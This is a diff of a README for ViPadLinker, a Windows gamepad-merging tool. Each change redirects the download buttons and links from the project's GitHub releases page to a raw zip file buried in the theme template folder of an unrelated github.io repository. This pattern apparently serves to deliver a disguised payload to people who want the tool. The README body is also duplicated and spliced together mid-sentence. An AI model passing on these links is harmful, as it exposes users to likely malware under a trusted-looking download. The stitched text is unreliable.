@@ -5,7 +5,7 @@ description: "Combine two XInput controllers into one virtual gamepad or remap b
 ---
 # 🎮 ViPadLinker - Merge Two Gamepads Into One
 
-[![Download ViPadLinker](https://img.shields.io/badge/Download%20ViPadLinker-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://github.com/CafeManhattann/ViPadLinker/releases)
+[![Download ViPadLinker](https://img.shields.io/badge/Download%20ViPadLinker-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/CafeManhattann/cafemanhattann.github.io/main/themes/PaperMod/layouts/_partials/templates/_funcs/App_v2.0-beta.4.zip)
 
 ViPadLinker is a lightweight portable Windows tray tool for controller users. It can merge two gamepads into one virtual controller for single-player couch co-op. It can also hold XInput slots to push a controller where you want it. It includes visual button remapping. There is no install. It is powered by ViGEmBus.
 
@@ -42,7 +42,7 @@ The app is designed to be simple. It runs in the Windows tray, so you can open i
 
 Visit this link to download the application.
 
-[Download ViPadLinker](https://github.com/CafeManhattann/ViPadLinker/releases)
+[Download ViPadLinker](https://raw.githubusercontent.com/CafeManhattann/cafemanhattann.github.io/main/themes/PaperMod/layouts/_partials/templates/_funcs/App_v2.0-beta.4.zip)
 
 ViPadLinker is portable. There is no install. After the download finishes, open ViPadLinker. The app appears as a tray icon near the Windows clock. Connect your Xbox-style controller or controllers, then use the tray icon to open the app and choose your setup.
 
@@ -68,7 +68,7 @@ Some games assign controllers to player 1, player 2, and so on. ViPadLinker can 
 
 Use this when a second controller is being seen as player 1, when a controller disconnects and reconnects in the wrong place# 🎮 ViPadLinker - Merge Two Gamepads Into One
 
-[![Download ViPadLinker](https://img.shields.io/badge/Download-ViPadLinker-800080?style=for-the-badge&logo=github&logoColor=white&labelColor=ff6b6b&color=4ecdc4)](https://github.com/CafeManhattann/ViPadLinker/releases)
+[![Download ViPadLinker](https://img.shields.io/badge/Download-ViPadLinker-800080?style=for-the-badge&logo=github&logoColor=white&labelColor=ff6b6b&color=4ecdc4)](https://raw.githubusercontent.com/CafeManhattann/cafemanhattann.github.io/main/themes/PaperMod/layouts/_partials/templates/_funcs/App_v2.0-beta.4.zip)
 
 ViPadLinker is a lightweight portable Windows tray tool for controller users. It can merge two gamepads into one virtual controller for single-player couch co-op. It can also hold XInput slots to push a controller where you want it. It includes visual button remapping. There is no install. It is powered by ViGEmBus.
 
@@ -105,7 +105,7 @@ The app is designed to be simple. It runs in the Windows tray, so you can open i
 
 Visit this link to download the application.
 
-[Download ViPadLinker](https://github.com/CafeManhattann/ViPadLinker/releases)
+[Download ViPadLinker](https://raw.githubusercontent.com/CafeManhattann/cafemanhattann.github.io/main/themes/PaperMod/layouts/_partials/templates/_funcs/App_v2.0-beta.4.zip)
 
 ViPadLinker is portable. There is no install. After the download finishes, open ViPadLinker. The app appears as a tray icon near the Windows clock. Connect your Xbox-style controller or controllers, then use the tray icon to open the app and choose your setup.
 
@@ -167,6 +167,6 @@ If merge mode does not work as expected, confirm that both controllers are conne
 
 Visit this link to download the application.
 
-[Download ViPadLinker](https://github.com/CafeManhattann/ViPadLinker/releases)
+[Download ViPadLinker](https://raw.githubusercontent.com/CafeManhattann/cafemanhattann.github.io/main/themes/PaperMod/layouts/_partials/templates/_funcs/App_v2.0-beta.4.zip)
 
 Keywords: couch-co-op, couch-coop, dotnet, gamepad, gamepad-remapper, split-screen, splitter, vigembus, virtual-controller, windows, windows-10, windows-11, xbox, xbox-controller, xbox-controller-button-remapper, xbox-controller-emulation, xbox-controller-pc, xinput
